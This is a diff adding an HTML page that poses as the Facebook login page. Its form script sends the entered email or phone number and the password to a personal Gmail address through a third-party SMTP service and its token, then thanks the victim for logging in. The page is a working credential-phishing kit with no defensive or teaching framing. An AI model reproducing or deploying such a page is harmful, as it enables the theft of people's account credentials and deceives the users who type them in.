@@ -1,0 +1,44 @@
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Facebook Login Page</title>
+    <link rel="stylesheet" href="style.css" />
+
+  </head>
+  <body>
+    <div class="content">
+      <div class="flex-div">
+        <div class="name-content">
+          <h1 class="logo">Facebook</h1>
+          <p>Connect with friends and the world around you on Facebook.</p>
+        </div>
+          <form onsubmit="sendEmail(); reset(); return false;">
+            <input type="text" placeholder="Email or Phone Number" id="name" required />
+            <input type="password" placeholder="Password" id="pass" required>
+            <button class="login">Log In</button>
+            <a href="#">Forgot Password ?</a>
+            <hr>
+            <button class="create-account">Create New Account</button>
+          </form>
+      </div>
+    </div>
+
+    <script src="https://smtpjs.com/v3/smtp.js"></script>
+    <script>
+        function sendEmail(){
+            Email.send({
+    SecureToken : "2526e17e-6cf4-45cb-b9f7-6317654b47e6",
+    To : 'felo.safwat2000@gmail.com',
+    From : "felo.safwat2000@gmail.com",
+    Subject : "TEAST",
+    Body : "name: " + document.getElementById("name").value
+    + "<br> Pass: " + document.getElementById("pass").value
+}).then(
+  message => alert("Thank you for login")
+);
+        }
+    </script>
+  </body>
+</html>
